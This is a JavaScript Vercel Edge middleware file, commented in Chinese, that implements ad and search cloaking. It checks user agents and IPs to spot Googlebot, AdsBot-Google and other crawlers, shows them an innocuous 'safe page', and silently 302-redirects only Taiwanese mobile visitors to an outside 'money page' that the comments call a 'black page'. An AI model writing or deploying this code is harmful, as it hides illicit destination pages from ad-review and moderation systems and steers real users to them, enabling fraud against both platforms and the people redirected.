export default function middleware(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const country = request.headers.get('x-vercel-ip-country') || '';
  const ip = request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '';
  const url = new URL(request.url);

  // --- 1. 增強機器人偵測 --- 
  const isGoogleBot = /Googlebot|AdsBot-Google|Google-Ads|Mediapartners-Google|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Facebot|Pinterestbot|Twitterbot|LinkedInBot/i.test(userAgent);
  const isKnownCrawler = /bot|crawler|spider|archiver|monitor|screenshot|headless/i.test(userAgent);

  // 簡易IP黑名單 (示例)
  const knownBotIps = [
    // '66.249.', '35.191.'
  ];
  const isIpBlacklisted = knownBotIps.some(botIp => ip.startsWith(botIp));

  // --- 2. 判斷是否為目標客戶 --- 
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  const isTargetUser = (country === 'TW' && isMobile && !isGoogleBot && !isKnownCrawler && !isIpBlacklisted);

  // --- 3. 核心 Cloaking 邏輯 --- 
  const moneyPageUrl = "https://goodmoney27.com/";

  if (isTargetUser) {
    // 目標用戶：302 跳轉到黑頁
    return Response.redirect(moneyPageUrl, 302);
  }

  // 非目標用戶（機器人/非台灣/非手機）：繼續顯示原始頁面 (Safe Page)
  // 在 Vercel Edge Middleware 中，返回 null 且不設置跳轉即表示繼續執行
  return new Response(null, {
    headers: { 'x-middleware-next': '1' }
  });
}
